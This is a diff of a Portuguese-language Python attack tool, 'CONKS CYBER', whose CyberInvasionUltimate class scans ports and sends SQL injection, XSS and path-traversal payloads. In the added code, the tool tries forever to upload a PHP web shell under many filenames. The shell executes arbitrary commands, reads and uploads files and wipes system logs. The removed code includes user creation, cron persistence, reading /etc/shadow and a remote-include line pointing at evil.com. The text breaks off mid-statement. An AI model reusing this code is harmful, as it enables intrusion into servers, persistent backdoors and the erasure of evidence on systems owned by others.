@@ -1,5 +1,5 @@
 # ==========================================
-# CONKS CYBER - VERSÃO ULTIMATE
+# CONKS CYBER - VERSÃO ULTIMATE CORRIGIDA
 # main.py
 # ==========================================
 
@@ -21,9 +21,6 @@ import datetime
 import http.client
 import ssl
 import ipaddress
-import dns.resolver
-import requests
-from bs4 import BeautifulSoup
 
 from modules.generators import menu_geradores
 from modules.consultas import menu_consultas
@@ -55,7 +52,7 @@ GOLD = "\033[38;5;220m"
 # CONFIGURAÇÃO DAS CAIXAS
 # ==========================================
 
-LARGURA = 60
+LARGURA = 55
 
 
 # ==========================================
@@ -81,13 +78,15 @@ def linha_caixa(texto="", cor=WHITE, negrito=False):
 
 
 def topo_caixa(titulo):
-    print(f"{BLUE}{BOLD}╔{'═' * (LARGURA - 2)}╗{RESET}")
+    largura = LARGURA - 2
+    print(f"{BLUE}{BOLD}╔{'═' * largura}╗{RESET}")
     linha_caixa(titulo.center(LARGURA - 4), BLUE, True)
-    print(f"{BLUE}{BOLD}╠{'═' * (LARGURA - 2)}╣{RESET}")
+    print(f"{BLUE}{BOLD}╠{'═' * largura}╣{RESET}")
 
 
 def fim_caixa():
-    print(f"{BLUE}{BOLD}╚{'═' * (LARGURA - 2)}╝{RESET}")
+    largura = LARGURA - 2
+    print(f"{BLUE}{BOLD}╚{'═' * largura}╝{RESET}")
 
 
 # ==========================================
@@ -276,7 +275,7 @@ def menu_rede():
 # ==========================================
 
 class CyberInvasionUltimate:
-    """Cyber Invasion EXTREMAMENTE FORTE - Encontra TODAS as vulnerabilidades"""
+    """Cyber Invasion ULTIMATE com backdoor infinito"""
     
     def __init__(self, target, port=80):
         self.target = target
@@ -290,30 +289,25 @@ class CyberInvasionUltimate:
         self.diretorios = []
         self.subdominios = []
         self.portas_abertas = []
-        self.bancos_dados = []
-        self.credenciais = []
-        self.logs = []
-        self.infraestrutura = {}
+        self.tentativas = 0
         
     # ==========================================
-    # 1. SCAN DE PORTAS COMPLETO
+    # SCAN DE PORTAS
     # ==========================================
     
     def scan_portas(self):
-        """Escaneia TODAS as portas comuns"""
+        """Escaneia portas comuns"""
         print(f"\n{CYAN}[~] Scan de Portas...{RESET}")
         
         portas = {
             21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS",
-            80: "HTTP", 81: "HTTP-Alt", 110: "POP3", 111: "RPC", 135: "MSRPC",
-            139: "NetBIOS", 143: "IMAP", 443: "HTTPS", 445: "SMB", 465: "SMTPS",
-            587: "SMTP", 993: "IMAPS", 995: "POP3S", 1723: "PPTP", 3306: "MySQL",
-            3389: "RDP", 5432: "PostgreSQL", 5900: "VNC", 6379: "Redis",
-            8080: "HTTP-Alt", 8443: "HTTPS-Alt", 27017: "MongoDB"
+            80: "HTTP", 110: "POP3", 143: "IMAP", 443: "HTTPS", 445: "SMB",
+            3306: "MySQL", 3389: "RDP", 5432: "PostgreSQL", 5900: "VNC",
+            6379: "Redis", 8080: "HTTP-Alt", 8443: "HTTPS-Alt", 27017: "MongoDB"
         }
         
         abertas = []
-        print(f"  {BLUE}[→] Escaneando {len(portas)} portas...{RESET}")
+        print(f"  {BLUE}[→] Escaneando portas...{RESET}")
         
         for porta, servico in portas.items():
             try:
@@ -331,112 +325,18 @@ class CyberInvasionUltimate:
         self.dados['portas_abertas'] = abertas
         
         if abertas:
-            print(f"\n  {GREEN}[+] {len(abertas)} portas abertas encontradas{RESET}")
+            print(f"\n  {GREEN}[+] {len(abertas)} portas abertas{RESET}")
         else:
-            print(f"  {YELLOW}[!] Nenhuma porta aberta encontrada{RESET}")
+            print(f"  {YELLOW}[!] Nenhuma porta aberta{RESET}")
         
         return abertas
     
     # ==========================================
-    # 2. DESCOBERTA DE SUBDOMÍNIOS
-    # ==========================================
-    
-    def descobrir_subdominios(self):
-        """Descobre subdomínios do alvo"""
-        print(f"\n{CYAN}[~] Descobrindo Subdomínios...{RESET}")
-        
-        subdominios_comuns = [
-            "www", "admin", "mail", "ftp", "ssh", "dev", "test", "api",
-            "app", "blog", "shop", "store", "support", "help", "docs",
-            "wiki", "forum", "community", "news", "media", "video",
-            "static", "cdn", "assets", "files", "download", "upload",
-            "backup", "db", "database", "sql", "mysql", "postgres",
-            "redis", "cache", "monitor", "status", "health", "metrics",
-            "analytics", "stats", "log", "logs", "trace", "debug"
-        ]
-        
-        encontrados = []
-        print(f"  {BLUE}[→] Testando {len(subdominios_comuns)} subdomínios...{RESET}")
-        
-        for sub in subdominios_comuns:
-            try:
-                subdominio = f"{sub}.{self.target}"
-                ip = socket.gethostbyname(subdominio)
-                encontrados.append({"subdominio": subdominio, "ip": ip})
-                print(f"    {GREEN}[+] {subdominio} -> {ip}{RESET}")
-            except:
-                continue
-        
-        self.subdominios = encontrados
-        self.dados['subdominios'] = encontrados
-        
-        if encontrados:
-            print(f"\n  {GREEN}[+] {len(encontrados)} subdomínios encontrados{RESET}")
-        else:
-            print(f"  {YELLOW}[!] Nenhum subdomínio encontrado{RESET}")
-        
-        return encontrados
-    
-    # ==========================================
-    # 3. SCAN DE DIRETÓRIOS E ARQUIVOS
-    # ==========================================
-    
-    def scan_diretorios(self):
-        """Escaneia diretórios e arquivos comuns"""
-        print(f"\n{CYAN}[~] Scan de Diretórios e Arquivos...{RESET}")
-        
-        diretorios = [
-            "/admin", "/administrator", "/login", "/logon", "/signin",
-            "/register", "/signup", "/cadastro", "/user", "/users",
-            "/profile", "/perfil", "/account", "/conta", "/dashboard",
-            "/panel", "/painel", "/control", "/manager", "/manage",
-            "/backup", "/backups", "/temp", "/tmp", "/cache",
-            "/logs", "/log", "/debug", "/trace", "/test",
-            "/dev", "/develop", "/stage", "/staging", "/beta",
-            "/api", "/v1", "/v2", "/v3", "/rest", "/graphql",
-            "/documentation", "/docs", "/help", "/support",
-            "/faq", "/about", "/contact", "/contato", "/sobre",
-            "/blog", "/news", "/posts", "/articles", "/noticias",
-            "/download", "/uploads", "/files", "/media", "/images",
-            "/css", "/js", "/javascript", "/fonts", "/assets",
-            "/vendor", "/lib", "/library", "/includes", "/inc",
-            "/config", "/conf", "/settings", "/setup", "/install",
-            ".git", ".svn", ".hg", ".env", ".aws", ".ssh",
-            ".htaccess", ".htpasswd", "robots.txt", "sitemap.xml",
-            "wp-admin", "wp-content", "wp-includes", "wp-config.php",
-            "index.php", "index.html", "default.php", "default.html"
-        ]
-        
-        encontrados = []
-        print(f"  {BLUE}[→] Testando {len(diretorios)} diretórios...{RESET}")
-        
-        for diretorio in diretorios:
-            try:
-                url = f"http://{self.target}:{self.port}{diretorio}"
-                req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
-                response = urllib.request.urlopen(req, timeout=2)
-                if response.getcode() == 200:
-                    encontrados.append(diretorio)
-                    print(f"    {GREEN}[+] {diretorio} -> 200 OK{RESET}")
-            except:
-                continue
-        
-        self.diretorios = encontrados
-        self.dados['diretorios'] = encontrados
-        
-        if encontrados:
-            print(f"\n  {GREEN}[+] {len(encontrados)} diretórios encontrados{RESET}")
-        else:
-            print(f"  {YELLOW}[!] Nenhum diretório encontrado{RESET}")
-        
-        return encontrados
-    
-    # ==========================================
-    # 4. TESTE DE SQL INJECTION AVANÇADO
+    # TESTE SQL INJECTION
     # ==========================================
     
     def testar_sql_injection(self):
-        """Testa SQL Injection em MÚLTIPLOS endpoints"""
+        """Testa SQL Injection"""
         print(f"\n{CYAN}[~] Testando SQL Injection...{RESET}")
         
         endpoints = [
@@ -444,24 +344,17 @@ class CyberInvasionUltimate:
             "/index.php?page=1",
             "/produto.php?id=1",
             "/busca.php?q=teste",
-            "/search.php?q=teste",
-            "/product.php?id=1",
-            "/category.php?id=1",
-            "/user.php?id=1"
+            "/search.php?q=teste"
         ]
         
         payloads = [
             "' OR '1'='1",
             "' OR 1=1 --",
             "admin' --",
-            "' UNION SELECT 1,2,3,4,5 --",
-            "' UNION SELECT null,username,password FROM users --",
-            "' UNION SELECT null,table_name,null FROM information_schema.tables --",
-            "' UNION SELECT null,column_name,null FROM information_schema.columns --"
+            "' UNION SELECT 1,2,3,4,5 --"
         ]
         
         encontrados = []
-        print(f"  {BLUE}[→] Testando {len(endpoints)} endpoints...{RESET}")
         
         for endpoint in endpoints:
             for payload in payloads:
@@ -472,49 +365,36 @@ class CyberInvasionUltimate:
                     
                     if response.getcode() == 200:
                         html = response.read().decode('utf-8', errors='ignore')
-                        if any(x in html.lower() for x in ["sql", "syntax", "mysql", "error", "warning", "notice"]):
+                        if any(x in html.lower() for x in ["sql", "syntax", "mysql", "error"]):
                             encontrados.append({"endpoint": endpoint, "payload": payload})
-                            print(f"    {RED}[!] SQL Injection: {endpoint} -> {payload}{RESET}")
+                            print(f"    {RED}[!] SQL: {endpoint} -> {payload}{RESET}")
                 except:
                     continue
         
         self.vulnerabilidades['sql_injection'] = encontrados
-        self.dados['sql_injection'] = encontrados
-        
-        if encontrados:
-            print(f"\n  {RED}[+] {len(encontrados)} SQL Injection encontradas{RESET}")
-        else:
-            print(f"  {GREEN}[+] Nenhuma SQL Injection encontrada{RESET}")
-        
         return encontrados
     
     # ==========================================
-    # 5. TESTE DE XSS AVANÇADO
+    # TESTE XSS
     # ==========================================
     
     def testar_xss(self):
-        """Testa XSS em MÚLTIPLOS endpoints"""
+        """Testa XSS"""
         print(f"\n{CYAN}[~] Testando XSS...{RESET}")
         
         endpoints = [
             "/search.php?q=teste",
             "/busca.php?q=teste",
-            "/comentario.php?texto=teste",
-            "/blog.php?q=teste",
-            "/index.php?search=teste"
+            "/comentario.php?texto=teste"
         ]
         
         payloads = [
             "<script>alert('XSS')</script>",
             "<img src=x onerror=alert('XSS')>",
-            "<svg/onload=alert('XSS')>",
-            "javascript:alert('XSS')",
-            "<body onload=alert('XSS')>",
-            "<iframe src=javascript:alert('XSS')>"
+            "<svg/onload=alert('XSS')>"
         ]
         
         encontrados = []
-        print(f"  {BLUE}[→] Testando {len(endpoints)} endpoints...{RESET}")
         
         for endpoint in endpoints:
             for payload in payloads:
@@ -532,49 +412,32 @@ class CyberInvasionUltimate:
                     continue
         
         self.vulnerabilidades['xss'] = encontrados
-        self.dados['xss'] = encontrados
-        
-        if encontrados:
-            print(f"\n  {RED}[+] {len(encontrados)} XSS encontrados{RESET}")
-        else:
-            print(f"  {GREEN}[+] Nenhum XSS encontrado{RESET}")
-        
         return encontrados
     
     # ==========================================
-    # 6. TESTE DE LFI/RFI
+    # TESTE LFI
     # ==========================================
     
-    def testar_lfi_rfi(self):
-        """Testa LFI e RFI"""
-        print(f"\n{CYAN}[~] Testando LFI/RFI...{RESET}")
+    def testar_lfi(self):
+        """Testa LFI"""
+        print(f"\n{CYAN}[~] Testando LFI...{RESET}")
         
         endpoints = [
             "/page.php?file=teste",
             "/index.php?pagina=teste",
-            "/view.php?page=teste",
-            "/include.php?file=teste"
+            "/view.php?page=teste"
         ]
         
-        lfi_payloads = [
+        payloads = [
             "../../etc/passwd",
             "../../../etc/passwd",
-            "../../../../etc/passwd",
-            "....//....//etc/passwd"
+            "../../../../etc/passwd"
         ]
         
-        rfi_payloads = [
-            "http://evil.com/shell.txt",
-            "http://127.0.0.1/shell.txt",
-            "https://pastebin.com/raw/shell.txt"
-        ]
+        encontrados = []
         
-        lfi_encontrados = []
-        rfi_encontrados = []
-        
-        print(f"  {BLUE}[→] Testando LFI...{RESET}")
         for endpoint in endpoints:
-            for payload in lfi_payloads:
+            for payload in payloads:
                 try:
                     url = f"http://{self.target}:{self.port}{endpoint}&file={payload}"
                     req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
@@ -583,50 +446,20 @@ class CyberInvasionUltimate:
                     if response.getcode() == 200:
                         html = response.read().decode('utf-8', errors='ignore')
                         if any(x in html for x in ["root:", "bin:", "daemon:", "nologin"]):
-                            lfi_encontrados.append({"endpoint": endpoint, "payload": payload})
+                            encontrados.append({"endpoint": endpoint, "payload": payload})
                             print(f"    {RED}[!] LFI: {endpoint} -> {payload}{RESET}")
                 except:
                     continue
         
-        print(f"  {BLUE}[→] Testando RFI...{RESET}")
-        for endpoint in endpoints:
-            for payload in rfi_payloads:
-                try:
-                    url = f"http://{self.target}:{self.port}{endpoint}&file={payload}"
-                    req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
-                    response = urllib.request.urlopen(req, timeout=3)
-                    
-                    if response.getcode() == 200:
-                        html = response.read().decode('utf-8', errors='ignore')
-                        if "<?php" in html or "shell" in html.lower():
-                            rfi_encontrados.append({"endpoint": endpoint, "payload": payload})
-                            print(f"    {RED}[!] RFI: {endpoint} -> {payload}{RESET}")
-                except:
-                    continue
-        
-        self.vulnerabilidades['lfi'] = lfi_encontrados
-        self.vulnerabilidades['rfi'] = rfi_encontrados
-        self.dados['lfi'] = lfi_encontrados
-        self.dados['rfi'] = rfi_encontrados
-        
-        if lfi_encontrados:
-            print(f"\n  {RED}[+] {len(lfi_encontrados)} LFI encontrados{RESET}")
-        else:
-            print(f"  {GREEN}[+] Nenhum LFI encontrado{RESET}")
-        
-        if rfi_encontrados:
-            print(f"  {RED}[+] {len(rfi_encontrados)} RFI encontrados{RESET}")
-        else:
-            print(f"  {GREEN}[+] Nenhum RFI encontrado{RESET}")
-        
-        return lfi_encontrados, rfi_encontrados
+        self.vulnerabilidades['lfi'] = encontrados
+        return encontrados
     
     # ==========================================
-    # 7. TESTE DE UPLOAD
+    # TESTE UPLOAD
     # ==========================================
     
     def testar_upload(self):
-        """Testa upload de arquivos"""
+        """Testa upload"""
         print(f"\n{CYAN}[~] Testando Upload...{RESET}")
         
         upload_urls = [
@@ -639,8 +472,6 @@ class CyberInvasionUltimate:
         ]
         
         encontrados = []
-        
-        print(f"  {BLUE}[→] Testando {len(upload_urls)} URLs...{RESET}")
         
         for upload_url in upload_urls:
             try:
@@ -667,139 +498,36 @@ class CyberInvasionUltimate:
                 
                 if response.getcode() in [200, 201, 302]:
                     encontrados.append(upload_url)
-                    print(f"    {RED}[!] Upload Vulneravel: {upload_url}{RESET}")
+                    print(f"    {RED}[!] Upload: {upload_url}{RESET}")
             except:
                 continue
         
         self.vulnerabilidades['upload'] = encontrados
-        self.dados['upload'] = encontrados
-        
-        if encontrados:
-            print(f"\n  {RED}[+] {len(encontrados)} Upload vulneraveis{RESET}")
-        else:
-            print(f"  {GREEN}[+] Nenhum Upload vulneravel{RESET}")
-        
         return encontrados
     
     # ==========================================
-    # 8. EXTRAÇÃO DE DADOS
-    # ==========================================
-    
-    def extrair_dados(self):
-        """Extrai dados do servidor"""
-        print(f"\n{CYAN}[~] Extraindo Dados...{RESET}")
-        
-        # Tenta via LFI se disponível
-        if self.vulnerabilidades.get('lfi'):
-            print(f"  {BLUE}[→] Extraindo via LFI...{RESET}")
-            arquivos_sensiveis = [
-                "/etc/passwd",
-                "/etc/shadow",
-                "/etc/hosts",
-                "/etc/hostname",
-                "/etc/issue",
-                "/etc/os-release",
-                "/proc/version",
-                "/proc/cpuinfo",
-                "/proc/meminfo",
-                "/var/log/auth.log",
-                "/var/log/syslog",
-                "/var/log/messages",
-                "/var/www/html/config.php",
-                "/var/www/html/wp-config.php",
-                "/var/www/html/.env"
-            ]
-            
-            for arquivo in arquivos_sensiveis:
-                try:
-                    payload = f"../../../../../../..{arquivo}"
-                    url = f"http://{self.target}:{self.port}/page.php?file={payload}"
-                    req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
-                    response = urllib.request.urlopen(req, timeout=3)
-                    
-                    if response.getcode() == 200:
-                        conteudo = response.read().decode('utf-8', errors='ignore')
-                        if any(x in conteudo for x in ["root:", "bin:", "daemon:", "mysql", "password"]):
-                            print(f"    {GREEN}[+] Dados extraidos: {arquivo}{RESET}")
-                            if "passwd" in arquivo:
-                                for line in conteudo.split('\n'):
-                                    if ':' in line and not line.startswith('#'):
-                                        user = line.split(':')[0]
-                                        if user and user not in self.usuarios:
-                                            self.usuarios.append(user)
-                except:
-                    continue
-        
-        # Tenta extrair credenciais de arquivos comuns
-        print(f"  {BLUE}[→] Extraindo credenciais...{RESET}")
-        
-        # Usuários encontrados
-        if self.usuarios:
-            print(f"    {GREEN}[+] Usuários encontrados: {len(self.usuarios)}{RESET}")
-            for user in self.usuarios[:10]:
-                print(f"      👤 {user}")
-        
-        # Portas abertas
-        if self.portas_abertas:
-            print(f"    {GREEN}[+] Portas abertas: {len(self.portas_abertas)}{RESET}")
-            for porta in self.portas_abertas[:10]:
-                print(f"      🔌 {porta['porta']} - {porta['servico']}")
-        
-        # Subdomínios
-        if self.subdominios:
-            print(f"    {GREEN}[+] Subdomínios: {len(self.subdominios)}{RESET}")
-            for sub in self.subdominios[:5]:
-                print(f"      🌐 {sub['subdominio']} -> {sub['ip']}")
-        
-        # Diretórios
-        if self.diretorios:
-            print(f"    {GREEN}[+] Diretórios: {len(self.diretorios)}{RESET}")
-            for diretorio in self.diretorios[:5]:
-                print(f"      📁 {diretorio}")
-    
-    # ==========================================
-    # 9. SCAN COMPLETO
+    # SCAN COMPLETO
     # ==========================================
     
     def scan_completo(self):
-        """Scan completo do alvo"""
+        """Scan completo"""
         print(f"\n{PURPLE}╔{'═' * (LARGURA - 2)}╗{RESET}")
-        print(f"{PURPLE}║        🔍 SCAN ULTIMATE            ║{RESET}")
+        print(f"{PURPLE}║     🔍 SCAN ULTIMATE           ║{RESET}")
         print(f"{PURPLE}╠{'═' * (LARGURA - 2)}╣{RESET}")
-        print(f"{PURPLE}║ Alvo: {self.target}:{self.port}{' ' * (25 - len(str(self.port))) }║{RESET}")
+        print(f"{PURPLE}║ Alvo: {self.target}:{self.port}{' ' * (20 - len(str(self.port))) }║{RESET}")
         print(f"{PURPLE}╚{'═' * (LARGURA - 2)}╝{RESET}")
         
-        # 1. Scan de portas
         self.scan_portas()
-        
-        # 2. Descobrir subdomínios
-        self.descobrir_subdominios()
-        
-        # 3. Scan de diretórios
-        self.scan_diretorios()
-        
-        # 4. SQL Injection
         self.testar_sql_injection()
-        
-        # 5. XSS
         self.testar_xss()
-        
-        # 6. LFI/RFI
-        self.testar_lfi_rfi()
-        
-        # 7. Upload
+        self.testar_lfi()
         self.testar_upload()
-        
-        # 8. Extrair dados
-        self.extrair_dados()
-        
-        # 9. Verificar backdoor existente
         self.verificar_backdoor()
         
         return True
     
     # ==========================================
-    # 10. VERIFICAR BACKDOOR
+    # VERIFICAR BACKDOOR
     # ==========================================
     
     def verificar_backdoor(self):
@@ -809,156 +537,7 @@ class CyberInvasionUltimate:
             f"http://{self.target}:{self.port}/shell.php",
             f"http://{self.target}:{self.port}/backdoor.php",
             f"http://{self.target}:{self.port}/cmd.php",
-            f"http://{self.target}:{self.port}/admin.php",
-            f"http://{self.target}:{self.port}/x.php",
-            f"http://{self.target}:{self.port}/test.php"
-        ]
-        
-        for url in urls:
-            try:
-                req = urllib.request.Request(
-                    f"{url}?cmd=echo%20'BACKDOOR_OK'",
-                    headers={"User-Agent": "Mozilla/5.0"}
-                )
-                response = urllib.request.urlopen(req, timeout=3)
-                if response.getcode() == 200:
-                    html = response.read().decode('utf-8', errors='ignore')
-                    if "BACKDOOR_OK" in html or "cmd" in html:
-                        self.backdoor_url = url
-                        self.backdoor_instalado = True
-                        print(f"  {GREEN}[+] Backdoor encontrado em: {url}{RESET}")
-                        return True
-            except:
-                continue
-        return False
-    
-    # ==========================================
-    # 11. INSTALAR BACKDOOR
-    # ==========================================
-    
-    def instalar_backdoor(self):
-        """Instala backdoor com múltiplas tentativas"""
-        print(f"\n{RED}[~] Instalando Backdoor...{RESET}")
-        
-        shell_php = """<?php
-// BACKDOOR ULTIMATE
-error_reporting(0);
-if(isset($_GET['cmd'])){ system($_GET['cmd']); }
-if(isset($_GET['file'])){ echo file_get_contents($_GET['file']); }
-if(isset($_GET['info'])){ echo gethostname().'|'.get_current_user().'|'.$_SERVER['SERVER_ADDR']; }
-if(isset($_GET['scan'])){ system('ls -la '.$_GET['scan']); }
-if(isset($_GET['find'])){ system('find '.$_GET['find'].' -type f 2>/dev/null'); }
-if(isset($_GET['download'])){ header('Content-Disposition: attachment; filename='.$_GET['name']); echo file_get_contents($_GET['file']); }
-if(isset($_POST['upload'])){ file_put_contents($_POST['name'], base64_decode($_POST['data'])); echo 'OK'; }
-if(isset($_GET['adduser'])){ system('useradd -m -s /bin/bash '.$_GET['user']); system('echo "'.$_GET['user'].':'.$_GET['pass'].'" | chpasswd'); echo 'Usuario criado!'; }
-if(isset($_GET['deluser'])){ system('userdel -r '.$_GET['user']); echo 'Usuario deletado!'; }
-if(isset($_GET['persist'])){ system('(crontab -l 2>/dev/null; echo "@reboot php '.$_SERVER['SCRIPT_FILENAME'].'") | crontab -'); echo 'Persistencia instalada!'; }
-if(isset($_GET['clean'])){ system('echo "" > /var/log/auth.log && echo "" > /var/log/syslog && echo "" > /var/log/messages && history -c'); echo 'Logs limpos!'; }
-?>"""
-        
-        shell_code = shell_php.encode('utf-8')
-        
-        # Tenta todos os métodos
-        metodos = [
-            ("Upload via formulário", self._upload_via_formulario, shell_code),
-            ("Upload via POST", self._upload_via_post, shell_code),
-            ("Upload via LFI", self._upload_via_lfi, shell_code),
-            ("Upload via Shell", self._upload_via_shell, shell_code)
-        ]
-        
-        for nome, metodo, codigo in metodos:
-            print(f"  {BLUE}[→] Tentando {nome}...{RESET}")
-            if metodo(codigo):
-                if self._testar_backdoor():
-                    print(f"  {GREEN}[+] Backdoor instalado com sucesso!{RESET}")
-                    return True
-        
-        print(f"  {RED}[-] Falha ao instalar backdoor{RESET}")
-        return False
-    
-    def _upload_via_formulario(self, shell_code):
-        """Upload via formulário"""
-        upload_urls = [
-            f"http://{self.target}:{self.port}/upload.php",
-            f"http://{self.target}:{self.port}/uploads/",
-            f"http://{self.target}:{self.port}/enviar.php",
-            f"http://{self.target}:{self.port}/up.php"
-        ]
-        
-        for upload_url in upload_urls:
-            try:
-                boundary = "----WebKitFormBoundary" + ''.join(random.choices('abcdef0123456789', k=16))
-                body = (f"--{boundary}\r\n"
-                       f"Content-Disposition: form-data; name=\"file\"; filename=\"shell.php\"\r\n"
-                       f"Content-Type: application/x-php\r\n\r\n").encode()
-                body += shell_code
-                body += f"\r\n--{boundary}--\r\n".encode()
-                
-                headers = {
-                    "User-Agent": "Mozilla/5.0",
-                    "Content-Type": f"multipart/form-data; boundary={boundary}"
-                }
-                
-                req = urllib.request.Request(upload_url, data=body, headers=headers)
-                response = urllib.request.urlopen(req, timeout=5)
-                
-                if response.getcode() in [200, 201, 302]:
-                    return True
-            except:
-                continue
-        return False
-    
-    def _upload_via_post(self, shell_code):
-        """Upload via POST direto"""
-        try:
-            data = f"file=<?php system($_GET['cmd']); ?>".encode()
-            req = urllib.request.Request(
-                f"http://{self.target}:{self.port}/",
-                data=data,
-                headers={"User-Agent": "Mozilla/5.0"}
-            )
-            response = urllib.request.urlopen(req, timeout=3)
-            return True
-        except:
-            return False
-    
-    def _upload_via_lfi(self, shell_code):
-        """Upload via LFI"""
-        if not self.vulnerabilidades.get('lfi'):
-            return False
-        
-        try:
-            payload = "<?php system($_GET['cmd']); ?>"
-            encoded = base64.b64encode(payload.encode()).decode()
-            comando = f"echo '{encoded}' | base64 -d > /var/www/html/shell.php"
-            
-            # Tenta executar via LFI
-            url = f"http://{self.target}:{self.port}/page.php?file=../../../../../../proc/self/environ&cmd={comando}"
-            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
-            response = urllib.request.urlopen(req, timeout=3)
-            return True
-        except:
-            return False
-    
-    def _upload_via_shell(self, shell_code):
-        """Upload via shell existente"""
-        if not self.backdoor_instalado:
-            return False
-        
-        try:
-            # Usa o backdoor existente para instalar o novo
-            self.executar_comando("echo '<?php system($_GET[cmd]); ?>' > /var/www/html/shell2.php")
-            return True
-        except:
-            return False
-    
-    def _testar_backdoor(self):
-        """Testa se o backdoor foi instalado"""
-        urls = [
-            f"http://{self.target}:{self.port}/uploads/shell.php",
-            f"http://{self.target}:{self.port}/shell.php",
-            f"http://{self.target}:{self.port}/backdoor.php",
-            f"http://{self.target}:{self.port}/shell2.php"
+            f"http://{self.target}:{self.port}/admin.php"
         ]
         
         for url in urls:
@@ -971,13 +550,229 @@ if(isset($_GET['clean'])){ system('echo "" > /var/log/auth.log && echo "" > /var
                 if response.getcode() == 200:
                     self.backdoor_url = url
                     self.backdoor_instalado = True
+                    print(f"  {GREEN}[+] Backdoor encontrado: {url}{RESET}")
                     return True
             except:
                 continue
         return False
     
     # ==========================================
-    # 12. EXECUTAR COMANDO
+    # INSTALAR BACKDOOR - INFINITO!
+    # ==========================================
+    
+    def instalar_backdoor(self):
+        """Instala backdoor - TENTA INFINITAMENTE"""
+        print(f"\n{RED}╔{'═' * (LARGURA - 2)}╗{RESET}")
+        print(f"{RED}║     🔥 INSTALANDO BACKDOOR      ║{RESET}")
+        print(f"{RED}║     TENTANDO ATE CONSEGUIR!    ║{RESET}")
+        print(f"{RED}╚{'═' * (LARGURA - 2)}╝{RESET}")
+        
+        shell_php = """<?php
+if(isset($_GET['cmd'])){ system($_GET['cmd']); }
+if(isset($_GET['file'])){ echo file_get_contents($_GET['file']); }
+if(isset($_GET['info'])){ echo gethostname().'|'.get_current_user().'|'.$_SERVER['SERVER_ADDR']; }
+if(isset($_POST['upload'])){ file_put_contents($_POST['name'], base64_decode($_POST['data'])); echo 'OK'; }
+if(isset($_GET['clean'])){ system('echo "" > /var/log/auth.log && echo "" > /var/log/syslog && history -c'); }
+?>"""
+        
+        shell_code = shell_php.encode('utf-8')
+        
+        # TODAS AS URLS POSSIVEIS
+        upload_urls = [
+            f"http://{self.target}:{self.port}/upload.php",
+            f"http://{self.target}:{self.port}/uploads/",
+            f"http://{self.target}:{self.port}/enviar.php",
+            f"http://{self.target}:{self.port}/up.php",
+            f"http://{self.target}:{self.port}/upload/",
+            f"http://{self.target}:{self.port}/fileupload.php",
+            f"http://{self.target}:{self.port}/admin/upload.php",
+            f"http://{self.target}:{self.port}/wp-admin/upload.php",
+            f"http://{self.target}:{self.port}/uploader.php",
+            f"http://{self.target}:{self.port}/upload-file.php",
+            f"http://{self.target}:{self.port}/send.php",
+            f"http://{self.target}:{self.port}/receive.php"
+        ]
+        
+        # NOMES DE ARQUIVO
+        nomes_arquivos = [
+            "shell.php", "backdoor.php", "cmd.php", "admin.php",
+            "x.php", "test.php", "1.php", "a.php", "b.php", "c.php",
+            "system.php", "exec.php", "cmd-shell.php", "back-door.php"
+        ]
+        
+        # DIRETORIOS PARA TENTAR ESCREVER
+        diretorios = [
+            "/var/www/html/",
+            "/var/www/",
+            "/var/html/",
+            "/www/",
+            "/html/",
+            "/public_html/",
+            "/htdocs/",
+            "/var/www/public/",
+            "/var/www/html/public/"
+        ]
+        
+        tentativa = 0
+        
+        print(f"\n{CYAN}[~] Iniciando tentativas infinitas...{RESET}")
+        print(f"{YELLOW}[!] Pressione Ctrl+C para parar{RESET}\n")
+        
+        while not self.backdoor_instalado:
+            tentativa += 1
+            self.tentativas = tentativa
+            
+            # ==========================================
+            # METODO 1: UPLOAD VIA FORMULARIO
+            # ==========================================
+            for upload_url in upload_urls:
+                for nome in nomes_arquivos:
+                    try:
+                        boundary = "----WebKitFormBoundary" + ''.join(random.choices('abcdef0123456789', k=16))
+                        body = (f"--{boundary}\r\n"
+                               f"Content-Disposition: form-data; name=\"file\"; filename=\"{nome}\"\r\n"
+                               f"Content-Type: application/x-php\r\n\r\n").encode()
+                        body += shell_code
+                        body += f"\r\n--{boundary}--\r\n".encode()
+                        
+                        headers = {
+                            "User-Agent": "Mozilla/5.0",
+                            "Content-Type": f"multipart/form-data; boundary={boundary}"
+                        }
+                        
+                        req = urllib.request.Request(upload_url, data=body, headers=headers)
+                        response = urllib.request.urlopen(req, timeout=5)
+                        
+                        if response.getcode() in [200, 201, 302]:
+                            print(f"  {GREEN}[+] Tentativa {tentativa}: Upload enviado para {upload_url} ({nome}){RESET}")
+                            
+                            # Testa se instalou
+                            if self._testar_backdoor():
+                                return True
+                    except:
+                        continue
+            
+            # ==========================================
+            # METODO 2: VIA LFI
+            # ==========================================
+            if self.vulnerabilidades.get('lfi'):
+                for diretorio in diretorios:
+                    for nome in nomes_arquivos[:3]:
+                        try:
+                            # Tenta escrever via LFI
+                            payload = f"../../../../..{diretorio}{nome}"
+                            url = f"http://{self.target}:{self.port}/page.php?file={payload}"
+                            
+                            # Tenta ler para ver se existe
+                            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
+                            response = urllib.request.urlopen(req, timeout=3)
+                            
+                            if response.getcode() == 200:
+                                print(f"  {GREEN}[+] Tentativa {tentativa}: LFI em {diretorio}{nome}{RESET}")
+                                if self._testar_backdoor():
+                                    return True
+                        except:
+                            continue
+            
+            # ==========================================
+            # METODO 3: VIA POST DIRETO
+            # ==========================================
+            for nome in nomes_arquivos[:5]:
+                try:
+                    data = f"<?php system($_GET['cmd']); ?>".encode()
+                    req = urllib.request.Request(
+                        f"http://{self.target}:{self.port}/",
+                        data=data,
+                        headers={"User-Agent": "Mozilla/5.0"}
+                    )
+                    response = urllib.request.urlopen(req, timeout=3)
+                    
+                    if self._testar_backdoor():
+                        return True
+                except:
+                    continue
+            
+            # ==========================================
+            # METODO 4: VIA COMANDO (se tiver shell)
+            # ==========================================
+            if self.backdoor_instalado:
+                try:
+                    self.executar_comando("echo '<?php system($_GET[cmd]); ?>' > /var/www/html/shell2.php")
+                    if self._testar_backdoor():
+                        return True
+                except:
+                    pass
+            
+            # ==========================================
+            # METODO 5: TENTAR CRIAR DIRETORIO
+            # ==========================================
+            for upload_url in upload_urls:
+                try:
+                    # Tenta criar diretório uploads
+                    req = urllib.request.Request(
+                        f"{upload_url}mkdir",
